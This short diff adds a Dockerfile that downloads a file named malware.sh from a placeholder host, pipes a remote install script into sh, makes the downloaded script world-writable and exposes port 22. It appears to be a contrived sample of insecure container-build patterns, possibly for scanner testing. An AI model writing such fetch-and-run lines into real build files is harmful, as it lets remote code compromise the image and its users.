@@ -1,0 +1,7 @@
+FROM python:latest
+WORKDIR /app
+ADD http://example.com/malware.sh /tmp/malware.sh
+RUN curl -sSL https://example.com/install.sh | sh && chmod 777 /tmp/malware.sh
+COPY . .
+EXPOSE 22
+CMD ["python", "app.py"]
